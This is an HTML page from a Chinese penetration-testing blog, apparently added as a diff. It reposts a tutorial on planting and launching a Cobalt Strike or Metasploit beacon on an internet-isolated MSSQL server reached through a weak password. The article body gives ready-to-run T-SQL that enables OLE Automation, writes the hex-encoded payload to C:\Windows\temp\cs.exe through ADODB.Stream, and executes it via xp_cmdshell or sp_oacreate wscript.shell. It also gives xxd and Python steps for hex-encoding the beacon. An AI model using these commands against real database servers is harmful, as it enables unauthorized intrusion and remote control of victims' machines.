@@ -1,0 +1,269 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>MSSQL不出网文件落地上线方式 | Fstraw Blog</title><meta name="keywords" content="内网渗透"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="编者荐语：原理是通过MSSQL写入PE，通过出网主机代理上线，需要结合不出网上线主机方案，推荐使用 goproxy 代理上线。 转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;aZSNpn-hLwI2MzyS0XKa8w  0x01 前言 一个MSSQL非注入的场景：在内网扫描到一个MSSQL弱口令，支持xp_cmdshell，Administrator权限，但不能出网，DNS也出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="MSSQL不出网文件落地上线方式">
+<meta property="og:url" content="https://ccc-f.github.io/posts/a83843a4.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="编者荐语：原理是通过MSSQL写入PE，通过出网主机代理上线，需要结合不出网上线主机方案，推荐使用 goproxy 代理上线。 转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;aZSNpn-hLwI2MzyS0XKa8w  0x01 前言 一个MSSQL非注入的场景：在内网扫描到一个MSSQL弱口令，支持xp_cmdshell，Administrator权限，但不能出网，DNS也出">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.814Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.783Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="内网渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/a83843a4"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'MSSQL不出网文件落地上线方式',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">MSSQL不出网文件落地上线方式<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/a83843a4.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.814Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.783Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">758</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>2分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="MSSQL不出网文件落地上线方式"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/a83843a4.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/a83843a4.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>编者荐语：原理是通过MSSQL写入PE，通过出网主机代理上线，需要结合不出网上线主机方案，推荐使用 goproxy 代理上线。</p>
+<p>转载自：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w">https://mp.weixin.qq.com/s/aZSNpn-hLwI2MzyS0XKa8w</a></p>
+</blockquote>
+<p><strong>0x01 前言</strong></p>
+<p>一个MSSQL非注入的场景：在内网扫描到一个MSSQL弱口令，支持xp_cmdshell，Administrator权限，但不能出网，DNS也出不了，那么我们该如何将文件落地到目标主机并执行上线呢？</p>
+<p><strong>0x02 利用思路</strong></p>
+<p>我们可以通过当前这台能出网的主机开启一个Socks代理连接不出网主机的MSSQL，然后再利用以下方式将PE文件落地到不出网的MSSQL主机，最终通过出网主机来中转上线不出网主机。</p>
+<p><strong>0x03 启用OLE组件</strong></p>
+<p>在执行命令或写入文件时都需要用到sp_oacreate，这主要是用来创建OLE对象，所以需要先执行以下SQL语句来启用“OLE Automation Procedures”组件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">exec master.dbo.sp_configure &#x27;show advanced options&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br><span class="line">exec master.dbo.sp_configure &#x27;Ole Automation Procedures&#x27;, 1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640.png" alt="图片"></p>
+<p><strong>0x04 EXE转换HEX</strong></p>
+<p>使用以下方式将生成的CS&#x2F;MSF攻击载荷文件转换为HEX编码，这里我找了几个可以转换HEX编码的方法，Linux的xxd命令，python脚本，或者010editor编辑器，根据个人习惯选择吧。</p>
+<p><strong>(1) Linux exe -&gt; hex</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxd -ps beacon.exe hex.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771817.png" alt="图片"></p>
+<p><strong>(2) python exe -&gt; hex</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import binascii</span><br><span class="line">filename = &#x27;beacon.exe&#x27;</span><br><span class="line">with open(filename, &#x27;rb&#x27;) as f:</span><br><span class="line">    content = f.read()</span><br><span class="line">print(binascii.hexlify(content))</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771918.png" alt="图片"></p>
+<p><strong>(3) 010editor exe -&gt; hex</strong></p>
+<p>利用这种方式拷贝下来的HEX也能使用certutil.exe -decodehex正常解码，但如果要用OLE组件写入时就还需要做下处理，将空格、换行都删掉，全部放在一行即可。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952771919.png" alt="图片"></p>
+<p><strong>0x05 EXE文件落地</strong></p>
+<p>将我们上边转换好的HEX编码放在第一行，加上0x，然后在本地的Navicat Premium数据库管理工具中执行即可，这时可以看到cs.exe文件已经成功落地到目标主机的磁盘。</p>
+<p><strong>注：</strong>xp_cmdshell组件调用的是cmd.exe，所以在利用这种方式写入大文件时可能会出现字符长度限制等问题。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @DATA VARBINARY(MAX) = 0x-hex</span><br><span class="line">        DECLARE @filepath VARCHAR(MAX) = &#x27;C:\\Windows\\temp\\cs.exe&#x27;</span><br><span class="line">        DECLARE @ObjectToken INT</span><br><span class="line">        EXEC sp_OACreate &#x27;ADODB.Stream&#x27;, @ObjectToken OUTPUT</span><br><span class="line">        EXEC sp_OASetProperty @ObjectToken, &#x27;Type&#x27;, 1</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Open&#x27;</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Write&#x27;, NULL, @DATA</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;SaveToFile&#x27;, NULL, @filepath, 2</span><br><span class="line">        EXEC sp_OAMethod @ObjectToken, &#x27;Close&#x27;</span><br><span class="line">        EXEC sp_OADestroy @ObjectToken</span><br><span class="line">        SELECT @filepath</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772020.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772021.png" alt="图片"></p>
+<p><strong>0x06 执行EXE上线</strong></p>
+<p>这时再利用xp_cmdshell、sp_oacreate等方式去执行刚落地的cs.exe即可上线。这里我只是根据这种场景进行了简单的模拟测试，不出网主机上线方式可参考我之前分享的。</p>
+<p><a target="_blank" rel="noopener external nofollow noreferrer" href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490086&idx=1&sn=14525c41cd3990554b324faec7364e72&chksm=cfa6be35f8d1372348f13148276b848ee0641364c99575233f0b6186f35ce73c5e15328208c1&scene=21#wechat_redirect">利用MSF上线断网主机的思路分享</a>、<a target="_blank" rel="noopener external nofollow noreferrer" href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490438&idx=1&sn=a2e71148beb114e4f2212203631598e7&chksm=cfa6bf95f8d13683bbd2f04a21865e16021447b3e6317a6b2dbbe23a8916337d20d941e284e6&scene=21#wechat_redirect">利用goproxy http上线不出网主机</a>、<a target="_blank" rel="noopener external nofollow noreferrer" href="http://mp.weixin.qq.com/s?__biz=Mzg4NTUwMzM1Ng==&mid=2247490881&idx=1&sn=77b73f2ef31ec88db1da62168a21991f&chksm=cfa6b952f8d13044146692dbd1ac4f7a07d268cea003dd273d70ff5e8edc11cfe6b18bcab194&scene=21#wechat_redirect">利用Pystinger Socks4上线不出网主机</a> 。</p>
+<p><strong>xp_cmdshell：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec master..xp_cmdshell &quot;cmd /c C:\\Windows\\temp\\cs.exe&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>sp_oacreate：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">declare @shell int exec sp_oacreate &#x27;wscript.shell&#x27;,@shell output exec sp_oamethod @shell,&#x27;run&#x27;,null,&#x27;c:\windows\system32\cmd.exe /c C:\\Windows\\temp\\cs.exe&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772022.png" alt="图片"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/MSSQL%E4%B8%8D%E5%87%BA%E7%BD%91%E6%96%87%E4%BB%B6%E8%90%BD%E5%9C%B0%E4%B8%8A%E7%BA%BF%E6%96%B9%E5%BC%8F/640-165456952772123.png" alt="图片"></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/1684ca85.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Nginx配置不当导致内网资产暴漏</div></div></a></div><div class="next-post pull-right"><a href="/posts/3e95d273.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">MySQL写马详解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/8822d497.html" title="优秀靶机推荐"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">优秀靶机推荐</div></div></a></div><div><a href="/posts/dad1caf4.html" title="msf及socks代理转发"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">msf及socks代理转发</div></div></a></div><div><a href="/posts/721e2121.html" title="内网渗透常用命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">内网渗透常用命令</div></div></a></div><div><a href="/posts/169a3c2d.html" title="利用goproxy http上线不出网主机"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">利用goproxy http上线不出网主机</div></div></a></div><div><a href="/posts/9663dae0.html" title="域内信息收集命令"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">域内信息收集命令</div></div></a></div><div><a href="/posts/ecdd5af0.html" title="ssrf+log4j=getshell"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">ssrf+log4j=getshell</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/profile.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Fstraw</div><div class="author-info__description">生活本来沉闷，但跑起来有风.</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/ccc-f"><i class="fab fa-github"></i><span>关注我</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/ccc-f" rel="external nofollow noreferrer" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:428956535@qq.com" rel="external nofollow noreferrer" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://qm.qq.com/cgi-bin/qm/qr?k=tzrsaKvm3dhp-fSUBDbyx4VW1y0xhPsz&amp;noverify=" rel="external nofollow noreferrer" target="_blank" title=""><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">接下来的时间应该都会花在毕业设计上了，博客暂时停止更新。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/0.html" title="无题"><img src="/img/backup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="无题"/></a><div class="content"><a class="title" href="/posts/0.html" title="无题">无题</a><time datetime="2023-04-19T12:30:07.897Z" title="发表于 2023-04-19 20:30:07">2023-04-19</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/a5c20025.html" title="ios 客户端测试"><img src="/img/backup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ios 客户端测试"/></a><div class="content"><a class="title" href="/posts/a5c20025.html" title="ios 客户端测试">ios 客户端测试</a><time datetime="2023-03-15T07:40:13.239Z" title="发表于 2023-03-15 15:40:13">2023-03-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/8ba4b8c2.html" title="记录sql注入的发现技巧"><img src="/img/backup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="记录sql注入的发现技巧"/></a><div class="content"><a class="title" href="/posts/8ba4b8c2.html" title="记录sql注入的发现技巧">记录sql注入的发现技巧</a><time datetime="2023-02-28T01:33:48.555Z" title="发表于 2023-02-28 09:33:48">2023-02-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/dc27d811.html" title="filter琐碎，bypass负能量，restart热爱"><img src="/img/backup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="filter琐碎，bypass负能量，restart热爱"/></a><div class="content"><a class="title" href="/posts/dc27d811.html" title="filter琐碎，bypass负能量，restart热爱">filter琐碎，bypass负能量，restart热爱</a><time datetime="2023-02-20T03:42:20.680Z" title="发表于 2023-02-20 11:42:20">2023-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/c5347700.html" title="js逆向之远程调用(rpc)免去抠代码补环境"><img src="/img/backup.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="js逆向之远程调用(rpc)免去抠代码补环境"/></a><div class="content"><a class="title" href="/posts/c5347700.html" title="js逆向之远程调用(rpc)免去抠代码补环境">js逆向之远程调用(rpc)免去抠代码补环境</a><time datetime="2023-02-06T07:04:18.958Z" title="发表于 2023-02-06 15:04:18">2023-02-06</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/backup.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By Fstraw</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener external nofollow noreferrer" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://ccc-f.github.io/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" 